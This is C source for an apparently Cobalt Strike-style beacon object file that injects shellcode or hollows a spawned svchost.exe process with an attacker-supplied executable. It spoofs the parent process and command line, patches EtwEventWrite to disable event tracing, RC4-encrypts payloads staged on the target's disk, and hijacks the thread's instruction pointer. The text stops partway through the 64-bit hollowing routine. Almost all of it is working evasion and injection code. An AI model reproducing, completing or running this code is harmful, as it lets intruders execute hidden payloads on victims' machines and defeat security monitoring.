#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <tlhelp32.h>

#include "hollow_defs.h"
#include "../No-Consolation/include/beacon.h"

#define MODE_PE        0
#define MODE_SHELLCODE 1
#define MODE_UPLOAD_ENC 2

#define SRC_BYTES      0
#define SRC_LOCAL_PATH 1

#define OUTPUT_YES     0
#define OUTPUT_NO      1

#define DEFAULT_TIMEOUT_MS 15000
#define POLL_INTERVAL_MS   100
#define OUTPUT_CHUNK_MAX   (1024 * 64)

#define DEFAULT_SPAWNTO_X64 "C:\\Windows\\System32\\svchost.exe"
#define DEFAULT_SPAWNTO_X86 "C:\\Windows\\SysWOW64\\svchost.exe"

/* ================================================================
 *  Minimal libc
 * ================================================================ */

static void *xmemset(void *d, int c, size_t n) {
    unsigned char *p = (unsigned char *)d;
    while (n--) *p++ = (unsigned char)c;
    return d;
}

static void *xmemcpy(void *d, const void *s, size_t n) {
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
    return d;
}


static void RC4(BYTE *data, DWORD len, BYTE *key, DWORD keyLen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
    for (int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) & 0xFF;
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
    for (DWORD k = 0, i = 0, j = 0; k < len; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

/* ================================================================
 *  Parsed PE info — abstracts 32/64 differences
 * ================================================================ */

typedef struct {
    BOOL is64;
    DWORD sizeOfImage;
    DWORD sizeOfHeaders;
    DWORD entryPointRva;
    DWORD numberOfSections;
    ULONG_PTR imageBase;
    IMAGE_DATA_DIRECTORY relocDir;
    DWORD firstSectionOffset; /* file offset to IMAGE_FIRST_SECTION from PE start */
} PE_INFO;

static BOOL ParsePE(BYTE *hdr, DWORD hdrSize, PE_INFO *info) {
    if (hdrSize < sizeof(IMAGE_DOS_HEADER)) {
        BeaconPrintf(CALLBACK_ERROR, "Too small");
        return FALSE;
    }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdr;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad MZ (0x%x)", pDos->e_magic);
        return FALSE;
    }
    if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32) > hdrSize) {
        BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of range");
        return FALSE;
    }

    PIMAGE_FILE_HEADER pFile = (PIMAGE_FILE_HEADER)(hdr + pDos->e_lfanew + 4);
    DWORD sig = *(DWORD*)(hdr + pDos->e_lfanew);
    if (sig != IMAGE_NT_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad PE signature");
        return FALSE;
    }

    info->numberOfSections = pFile->NumberOfSections;

    if (pFile->Machine == IMAGE_FILE_MACHINE_AMD64) {
        info->is64 = TRUE;
        PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(hdr + pDos->e_lfanew);
        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > hdrSize) {
            BeaconPrintf(CALLBACK_ERROR, "NT headers out of range");
            return FALSE;
        }
        info->sizeOfImage    = pNt->OptionalHeader.SizeOfImage;
        info->sizeOfHeaders  = pNt->OptionalHeader.SizeOfHeaders;
        info->entryPointRva  = pNt->OptionalHeader.AddressOfEntryPoint;
        info->imageBase      = (ULONG_PTR)pNt->OptionalHeader.ImageBase;
        info->relocDir       = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        info->firstSectionOffset = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64);
    } else if (pFile->Machine == IMAGE_FILE_MACHINE_I386) {
        info->is64 = FALSE;
        PIMAGE_NT_HEADERS32 pNt = (PIMAGE_NT_HEADERS32)(hdr + pDos->e_lfanew);
        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32) > hdrSize) {
            BeaconPrintf(CALLBACK_ERROR, "NT headers out of range");
            return FALSE;
        }
        info->sizeOfImage    = pNt->OptionalHeader.SizeOfImage;
        info->sizeOfHeaders  = pNt->OptionalHeader.SizeOfHeaders;
        info->entryPointRva  = pNt->OptionalHeader.AddressOfEntryPoint;
        info->imageBase      = (ULONG_PTR)pNt->OptionalHeader.ImageBase;
        info->relocDir       = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        info->firstSectionOffset = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unsupported machine: 0x%x", pFile->Machine);
        return FALSE;
    }

    if (info->entryPointRva == 0) {
        BeaconPrintf(CALLBACK_ERROR, "EntryPoint is zero (managed PE?)");
        return FALSE;
    }

    return TRUE;
}

/* ================================================================
 *  PPID spoofing helpers
 * ================================================================ */

static DWORD FindPidByName(const char *procName) {
    PROCESSENTRY32 pe;
    xmemset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    DWORD pid = 0;
    if (KERNEL32$Process32First(hSnap, &pe)) {
        do {
            if (MSVCRT$_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnap, &pe));
    }
    KERNEL32$CloseHandle(hSnap);
    return pid;
}

static DWORD FindSpoofParent(const char *spawntoA) {
    const char *name = spawntoA;
    const char *p = spawntoA;
    while (*p) { if (*p == '\\' || *p == '/') name = p + 1; p++; }
    if (MSVCRT$_stricmp(name, "svchost.exe") == 0) return FindPidByName("services.exe");
    if (MSVCRT$_stricmp(name, "RuntimeBroker.exe") == 0 ||
        MSVCRT$_stricmp(name, "dllhost.exe") == 0 ||
        MSVCRT$_stricmp(name, "taskhostw.exe") == 0) return FindPidByName("svchost.exe");
    return FindPidByName("explorer.exe");
}

/* ================================================================
 *  ETW patching (per-boot ASLR, GetModuleHandleA only)
 * ================================================================ */

static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hMod,
                                const char *funcName, BYTE *patch, DWORD patchLen) {
    FARPROC pFunc = KERNEL32$GetProcAddress(hMod, funcName);
    if (!pFunc) return FALSE;
    DWORD oldProt = 0;
    if (!KERNEL32$VirtualProtectEx(hProcess, (LPVOID)pFunc, patchLen, PAGE_READWRITE, &oldProt))
        return FALSE;
    SIZE_T written = 0;
    BOOL ok = KERNEL32$WriteProcessMemory(hProcess, (LPVOID)pFunc, patch, patchLen, &written);
    DWORD dummy = 0;
    KERNEL32$VirtualProtectEx(hProcess, (LPVOID)pFunc, patchLen, oldProt, &dummy);
    return ok && (written == patchLen);
}

static void PatchETW(HANDLE hProcess) {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", patch, sizeof(patch));
}

/* ================================================================
 *  Output capture
 * ================================================================ */

static void DrainPipe(HANDLE hPipe) {
    DWORD avail = 0;
    if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0) return;
    if (avail > OUTPUT_CHUNK_MAX) avail = OUTPUT_CHUNK_MAX;
    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, avail + 1);
    if (!buf) return;
    DWORD br = 0;
    KERNEL32$ReadFile(hPipe, buf, avail, &br, NULL);
    if (br > 0) {
        buf[br] = 0;
        BeaconOutput(CALLBACK_OUTPUT, (char*)buf, br);
    }
    KERNEL32$LocalFree(buf);
}

static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
    DWORD elapsed = 0, exitCode = 259;
    while (elapsed < timeoutMs) {
        DrainPipe(hPipe);
        KERNEL32$GetExitCodeProcess(hProcess, &exitCode);
        if (exitCode != 259) break;
        KERNEL32$Sleep(POLL_INTERVAL_MS);
        elapsed += POLL_INTERVAL_MS;
    }
    DrainPipe(hPipe);
    if (exitCode == 259) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout %lus, killing child", timeoutMs / 1000);
        KERNEL32$TerminateProcess(hProcess, 1);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Child exit code: %lu", exitCode);
    }
}

/* ================================================================
 *  Create suspended process
 * ================================================================ */

typedef struct {
    STARTUPINFOEXA si;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList;
    HANDLE hParent;
    HANDLE hPipeOutRead, hPipeOutWrite;
    HANDLE hPipeInRead, hPipeInWrite;
    PROCESS_INFORMATION pi;
} SPAWN_CTX;

static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
    if (ctx->attrList) { KERNEL32$DeleteProcThreadAttributeList(ctx->attrList); KERNEL32$LocalFree(ctx->attrList); ctx->attrList = NULL; }
    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }
    if (ctx->hPipeInRead) { KERNEL32$CloseHandle(ctx->hPipeInRead); ctx->hPipeInRead = NULL; }
    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (!keepProc) {
        if (ctx->hPipeOutRead) { KERNEL32$CloseHandle(ctx->hPipeOutRead); ctx->hPipeOutRead = NULL; }
        if (ctx->hPipeInWrite) { KERNEL32$CloseHandle(ctx->hPipeInWrite); ctx->hPipeInWrite = NULL; }
        if (ctx->pi.hProcess) { KERNEL32$TerminateProcess(ctx->pi.hProcess, 1); KERNEL32$CloseHandle(ctx->pi.hProcess); ctx->pi.hProcess = NULL; }
        if (ctx->pi.hThread) { KERNEL32$CloseHandle(ctx->pi.hThread); ctx->pi.hThread = NULL; }
    }
}

static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput,
                           int realCmdMinBytes, SPAWN_CTX *ctx) {
    xmemset(ctx, 0, sizeof(SPAWN_CTX));
    ctx->si.StartupInfo.cb = sizeof(STARTUPINFOA);

    SECURITY_ATTRIBUTES sa;
    xmemset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (wantOutput) {
        if (!KERNEL32$CreatePipe(&ctx->hPipeOutRead, &ctx->hPipeOutWrite, &sa, 0) ||
            !KERNEL32$CreatePipe(&ctx->hPipeInRead, &ctx->hPipeInWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe: %lu", KERNEL32$GetLastError());
            SpawnCleanup(ctx, FALSE);
            return FALSE;
        }
        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1, 0);
        KERNEL32$SetHandleInformation(ctx->hPipeInWrite, 1, 0);
        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
        ctx->si.StartupInfo.hStdInput  = ctx->hPipeInRead;
        ctx->si.StartupInfo.hStdOutput = ctx->hPipeOutWrite;
        ctx->si.StartupInfo.hStdError  = ctx->hPipeOutWrite;
    } else {
        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
    }

    char fakeCmd[4096];
    xmemset(fakeCmd, 0, sizeof(fakeCmd));
    int fakeLen = MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1,
        "%s -k LocalServiceNetworkRestricted", spawntoA);
    if (fakeLen < 0) fakeLen = MSVCRT$strlen(fakeCmd);
    if (realCmdMinBytes > 0 && fakeLen < realCmdMinBytes) {
        int i;
        for (i = fakeLen; i < realCmdMinBytes && i < (int)sizeof(fakeCmd) - 1; i++)
            fakeCmd[i] = ' ';
        fakeCmd[i] = '\0';
    }

    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

    if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
            flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
        SpawnCleanup(ctx, FALSE);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu suspended", ctx->pi.dwProcessId);

    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (ctx->hPipeInRead)   { KERNEL32$CloseHandle(ctx->hPipeInRead);   ctx->hPipeInRead = NULL; }

    return TRUE;
}

/* ================================================================
 *  PEB command-line spoofing
 * ================================================================ */

static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
    PROCESS_BASIC_INFORMATION pbi;
    xmemset(&pbi, 0, sizeof(pbi));
    if (NTDLL$NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL) != 0)
        return FALSE;
    PEB peb;
    SIZE_T br = 0;
    if (!KERNEL32$ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &br))
        return FALSE;
    RTL_USER_PROCESS_PARAMETERS params;
    if (!KERNEL32$ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &br))
        return FALSE;
    int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, NULL, 0);
    if (wLen == 0) return FALSE;
    LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
    if (!wBuf) return FALSE;
    KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wBuf, wLen);
    SIZE_T bw = 0;
    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wBuf, wLen * sizeof(WCHAR), &bw);
    USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
    KERNEL32$WriteProcessMemory(hProcess,
        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &newLen, sizeof(USHORT), &bw);
    KERNEL32$LocalFree(wBuf);
    return TRUE;
}

/* ================================================================
 *  Write PE sections to child
 * ================================================================ */

static BOOL WritePEToChild(HANDLE hProcess, BYTE *pRemote,
                           BYTE *peData, DWORD payloadSize,
                           BYTE *hdr, PE_INFO *info) {
    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)(hdr + info->firstSectionOffset);
    SIZE_T bw = 0;

    KERNEL32$WriteProcessMemory(hProcess, pRemote, peData, info->sizeOfHeaders, &bw);

    for (DWORD i = 0; i < info->numberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > payloadSize) continue;
        KERNEL32$WriteProcessMemory(hProcess,
            pRemote + pSec[i].VirtualAddress,
            peData + pSec[i].PointerToRawData,
            pSec[i].SizeOfRawData, &bw);
    }
    return TRUE;
}

/* ================================================================
 *  Read file on target
 * ================================================================ */

static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
    *outSize = 0;
    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot open %s: %lu", path, KERNEL32$GetLastError());
        return NULL;
    }
    DWORD sz = KERNEL32$GetFileSize(hFile, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad file size for %s: %lu", path, sz);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }
    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, sz);
    if (!buf) { KERNEL32$CloseHandle(hFile); return NULL; }
    DWORD br = 0;
    if (!KERNEL32$ReadFile(hFile, buf, sz, &br, NULL) || br != sz) {
        KERNEL32$LocalFree(buf);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }
    KERNEL32$CloseHandle(hFile);
    *outSize = sz;
    return buf;
}

/* ================================================================
 *  Apply relocations in child process memory
 * ================================================================ */

static int ApplyRelocationsRemote(HANDLE hProcess, BYTE *pRemote, PE_INFO *info, ULONG_PTR delta) {
    if (info->relocDir.Size == 0 || info->relocDir.VirtualAddress == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Relocs needed but PE has none");
        return -1;
    }

    BYTE *relocData = (BYTE*)KERNEL32$LocalAlloc(0x40, info->relocDir.Size);
    if (!relocData) return -1;

    SIZE_T rr = 0;
    KERNEL32$ReadProcessMemory(hProcess,
        pRemote + info->relocDir.VirtualAddress, relocData, info->relocDir.Size, &rr);

    BYTE *pBlock = relocData;
    DWORD processed = 0;
    int count = 0;

    while (processed < info->relocDir.Size) {
        DWORD pageRva   = *(DWORD*)(pBlock);
        DWORD blockSize = *(DWORD*)(pBlock + 4);
        if (blockSize == 0 || blockSize < 8) break;
        DWORD entries = (blockSize - 8) / 2;
        WORD *entry = (WORD*)(pBlock + 8);

        BYTE pageBuf[4096];
        DWORD pageSize = 4096;
        if (pageRva + pageSize > info->sizeOfImage)
            pageSize = info->sizeOfImage - pageRva;
        SIZE_T pbr = 0;
        KERNEL32$ReadProcessMemory(hProcess, pRemote + pageRva, pageBuf, pageSize, &pbr);

        BOOL modified = FALSE;
        for (DWORD j = 0; j < entries; j++) {
            BYTE type = (BYTE)(entry[j] >> 12);
            WORD off  = entry[j] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64 && off + 8 <= pageSize) {
                *(ULONG_PTR*)(pageBuf + off) += delta;
                count++; modified = TRUE;
            } else if (type == IMAGE_REL_BASED_HIGHLOW && off + 4 <= pageSize) {
                *(DWORD*)(pageBuf + off) += (DWORD)delta;
                count++; modified = TRUE;
            } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                /* padding, skip */
            }
        }

        if (modified) {
            SIZE_T bw = 0;
            KERNEL32$WriteProcessMemory(hProcess, pRemote + pageRva, pageBuf, pageSize, &bw);
        }

        pBlock += blockSize;
        processed += blockSize;
    }
    KERNEL32$LocalFree(relocData);
    return count;
}

/* ================================================================
 *  BOF entry
 *
 *  Args (bof_pack): mode, source, noOutput, timeout, flags, unused,
 *                   spawnto, args, localPath, payload
 *
 *  flags bit 0: force x86 (for shellcode — PE auto-detects)
 * ================================================================ */

void go(char *rawArgs, int rawLen) {
    datap parser;
    BeaconDataParse(&parser, rawArgs, rawLen);

    int mode       = BeaconDataInt(&parser);
    int source     = BeaconDataInt(&parser);
    int noOutput   = BeaconDataInt(&parser);
    int timeoutMs  = BeaconDataInt(&parser);
    int flags      = BeaconDataInt(&parser);
    int unused     = BeaconDataInt(&parser);

    int spawntoLen = 0;
    char *spawnto  = BeaconDataExtract(&parser, &spawntoLen);
    int argsLen = 0;
    char *args     = BeaconDataExtract(&parser, &argsLen);
    int localPathLen = 0;
    char *localPath  = BeaconDataExtract(&parser, &localPathLen);
    int peDataLen = 0;
    char *peData     = BeaconDataExtract(&parser, &peDataLen);

    if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
    BOOL wantOutput = (noOutput != OUTPUT_NO);
    BOOL forceX86 = (flags & 1);
    BOOL decryptLocal = (flags & 2);

    /* ---- Get payload ---- */
    BYTE *payload = NULL;
    DWORD payloadSize = 0;
    BOOL freePayload = FALSE;
    BYTE *payloadAllocBase = NULL;

    if (source == SRC_LOCAL_PATH) {
        if (!localPath || !localPath[0]) { BeaconPrintf(CALLBACK_ERROR, "No local path"); return; }
        DWORD t0 = KERNEL32$GetTickCount();
        payload = ReadLocalFile(localPath, &payloadSize);
        DWORD t1 = KERNEL32$GetTickCount();
        if (!payload) return;
        freePayload = TRUE;
        payloadAllocBase = payload;

        if (decryptLocal && payloadSize <= 16) {
            BeaconPrintf(CALLBACK_ERROR, "Encrypted file too small (%lu bytes, need >16)", payloadSize);
            goto cleanup;
        }
        if (decryptLocal && payloadSize > 16) {
            BYTE key[16];
            xmemcpy(key, payload, 16);
            payload += 16;
            payloadSize -= 16;
            RC4(payload, payloadSize, key, 16);
            xmemset(key, 0, 16);
            DWORD t2 = KERNEL32$GetTickCount();
            BeaconPrintf(CALLBACK_OUTPUT, "[*] read=%lums rc4=%lums size=%lu", t1-t0, t2-t1, payloadSize);
        }
    } else {
        if (!peData || peDataLen <= 0) { BeaconPrintf(CALLBACK_ERROR, "No payload bytes"); return; }
        payload = (BYTE*)peData;
        payloadSize = (DWORD)peDataLen;
    }

    /* ---- MODE_UPLOAD_ENC: encrypt and write to target disk, then exit ---- */
    if (mode == MODE_UPLOAD_ENC) {
        if (!localPath || !localPath[0]) {
            BeaconPrintf(CALLBACK_ERROR, "No target path for --upload-enc (use --enc-path)");
            goto cleanup;
        }

        BYTE key[16];
        ADVAPI32$SystemFunction036(key, sizeof(key));

        BYTE *encBuf = (BYTE*)KERNEL32$LocalAlloc(0x40, payloadSize);
        if (!encBuf) { BeaconPrintf(CALLBACK_ERROR, "LocalAlloc: %lu", KERNEL32$GetLastError()); goto cleanup; }
        xmemcpy(encBuf, payload, payloadSize);
        RC4(encBuf, payloadSize, key, 16);

        HANDLE hFile = KERNEL32$CreateFileA(localPath, GENERIC_WRITE, 0,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateFile %s: %lu", localPath, KERNEL32$GetLastError());
            KERNEL32$LocalFree(encBuf);
            goto cleanup;
        }

        DWORD bw = 0;
        KERNEL32$WriteFile(hFile, key, 16, &bw, NULL);
        KERNEL32$WriteFile(hFile, encBuf, payloadSize, &bw, NULL);
        KERNEL32$CloseHandle(hFile);

        xmemset(key, 0, 16);
        xmemset(encBuf, 0, payloadSize);
        KERNEL32$LocalFree(encBuf);

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Encrypted %lu bytes -> %s (%lu bytes on disk)",
            payloadSize, localPath, payloadSize + 16);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use: hollow --local-pe %s --dec -a \"args\"", localPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
        goto cleanup;
    }

    /* ---- Parse PE headers (if PE mode) ---- */
    PE_INFO peInfo;
    xmemset(&peInfo, 0, sizeof(peInfo));
    BYTE hdrBuf[4096];
    DWORD hdrPeek = (payloadSize < sizeof(hdrBuf)) ? payloadSize : sizeof(hdrBuf);
    xmemcpy(hdrBuf, payload, hdrPeek);

    BOOL isX86 = forceX86;

    if (mode == MODE_PE) {
        if (!ParsePE(hdrBuf, hdrPeek, &peInfo)) goto cleanup;
        isX86 = !peInfo.is64;
    }

    /* ---- Pick spawnto ---- */
    const char *spawntoA;
    if (spawnto && spawnto[0]) {
        spawntoA = spawnto;
    } else {
        spawntoA = isX86 ? DEFAULT_SPAWNTO_X86 : DEFAULT_SPAWNTO_X64;
    }


    /* ---- Compute real command line length for PEB padding ---- */
    int realCmdMinBytes = 0;
    if (mode == MODE_PE && args && args[0]) {
        const char *bn = spawntoA;
        const char *s = spawntoA;
        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
        realCmdMinBytes = MSVCRT$strlen(bn) + 1 + MSVCRT$strlen(args);
    }

    /* ---- Create suspended process ---- */
    SPAWN_CTX sctx;
    if (!SpawnSuspended(spawntoA, wantOutput, realCmdMinBytes, &sctx))
        goto cleanup;

    BOOL ok = FALSE;

    if (mode == MODE_SHELLCODE) {
        /* ---- SHELLCODE INJECTION ---- */
        LPVOID pSc = KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL, payloadSize + 32,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pSc) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
            SpawnCleanup(&sctx, FALSE); goto cleanup;
        }

        SIZE_T bw = 0;

        if (isX86) {
            /* x86 shellcode in WoW64 process: write a 64-bit trampoline
               that transitions to 32-bit mode via retf, then runs the SC.
               Trampoline (10 bytes):
                 push 0x23                ; 32-bit CS selector
                 mov eax, <sc_addr_32>    ; shellcode address (32-bit)
                 push rax
                 retfq                    ; far return → 32-bit mode
            */
            DWORD scAddr32 = (DWORD)((ULONG_PTR)pSc + 16); /* shellcode starts after trampoline */
            BYTE tramp[10];
            tramp[0] = 0x6A; tramp[1] = 0x23;                         /* push 0x23 */
            tramp[2] = 0xB8;                                           /* mov eax, imm32 */
            *(DWORD*)(tramp + 3) = scAddr32;
            tramp[7] = 0x50;                                           /* push rax */
            tramp[8] = 0x48; tramp[9] = 0xCB;                         /* retfq */

            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, pSc, tramp, sizeof(tramp), &bw);
            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (BYTE*)pSc + 16, payload, payloadSize, &bw);

            DWORD oldProt = 0;
            KERNEL32$VirtualProtectEx(sctx.pi.hProcess, pSc, payloadSize + 16, PAGE_EXECUTE_READ, &oldProt);

            /* Set RIP to trampoline (64-bit context — thread starts in 64-bit mode) */
            CONTEXT ctx;
            xmemset(&ctx, 0, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_ALL;
            KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx);
            ctx.Rip = (DWORD64)pSc;
            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);

        } else {
            /* x64 shellcode — direct RIP hijack */
            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, pSc, payload, payloadSize, &bw);

            DWORD oldProt = 0;
            KERNEL32$VirtualProtectEx(sctx.pi.hProcess, pSc, payloadSize, PAGE_EXECUTE_READ, &oldProt);

            CONTEXT ctx;
            xmemset(&ctx, 0, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_ALL;
            KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx);
            ctx.Rip = (DWORD64)pSc;
            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);

        }

        PatchETW(sctx.pi.hProcess);
        ok = TRUE;

    } else {
        /* ---- PE HOLLOWING ---- */
        DWORD hdrMax = 4096;
        BYTE *hdr = (BYTE*)KERNEL32$LocalAlloc(0x40, hdrMax);
        if (!hdr) { SpawnCleanup(&sctx, FALSE); goto cleanup; }
        xmemcpy(hdr, payload, (payloadSize < hdrMax) ? payloadSize : hdrMax);

        PE_INFO pi2;
        if (!ParsePE(hdr, hdrMax, &pi2)) {
            KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
        }

        if (pi2.is64) {
            /* ---- x64 PE HOLLOWING ---- */
            CONTEXT ctx;
            xmemset(&ctx, 0, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_ALL;
            if (!KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx)) {
                BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

            ULONG_PTR pebAddr = ctx.Rdx;
            ULONG_PTR origBase = 0;
            SIZE_T br = 0;
            KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(pebAddr + 0x10),
                &origBase, sizeof(origBase), &br);

            NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)origBase);

            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote)
                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                    (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote)
                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pRemote) {
                BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
            }

            WritePEToChild(sctx.pi.hProcess, pRemote, payload, payloadSize, hdr, &pi2);

            ULONG_PTR delta = (ULONG_PTR)pRemote - pi2.imageBase;
            if (delta != 0) {
                int rc = ApplyRelocationsRemote(sctx.pi.hProcess, pRemote, &pi2, delta);
                if (rc < 0) { KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup; }

                PIMAGE_DOS_HEADER pD = (PIMAGE_DOS_HEADER)hdr;
                ULONG_PTR newImgBase = (ULONG_PTR)pRemote;
                SIZE_T bw2 = 0;
                KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
                    pRemote + pD->e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
                    offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase),
                    &newImgBase, sizeof(newImgBase), &bw2);
            }

            /* Update PEB ImageBase */
            ULONG_PTR newBase = (ULONG_PTR)pRemote;
            SIZE_T bw3 = 0;
